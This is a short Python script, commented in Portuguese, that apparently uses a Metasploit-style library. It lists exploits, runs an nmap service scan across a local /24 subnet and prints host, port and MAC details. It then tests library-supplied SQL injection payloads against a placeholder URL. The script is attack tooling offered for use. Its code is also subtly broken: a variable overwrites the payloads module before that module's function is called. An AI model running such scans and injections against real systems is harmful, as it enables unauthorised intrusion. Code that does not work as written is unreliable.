from metasploit import MetasploitClient, NmapScanner
from metasploit.nmap_integration import  NmapScanner
from metasploit import payloads
import nmap


client = MetasploitClient('senha')
exploits = client.list_exploits()
print(exploits)

nm = nmap.PortScanner()
scanNmap = nm.scan('192.168.1.0/24', arguments='-sV')

resultados = NmapScanner.scan_hosts(scanNmap)
for host in resultados:
    print(f"Host: {host['host']}")
    print(f"Estado: {host['estado']}")
    for porta in host['portas']:
        print(f"Porta: {porta['porta']} / Protocolo: {porta['protocolo']} / Estado: {porta['estado']} / Serviço: {porta['servico']}")
    print(f"Endereço MAC: {host['enderecoMAC']} (Fabricante: {host['fabricante']})")
    print("-" * 40)

url = "http://example.com/page?id="
payloads = payloads.sql_injection_payloads()
resultados = payloads.testar_payloads(url, payloads)
for payload, resultado in resultados.items():
    print(f"Payload: {payload}")
    print(f"Resultado: {resultado}")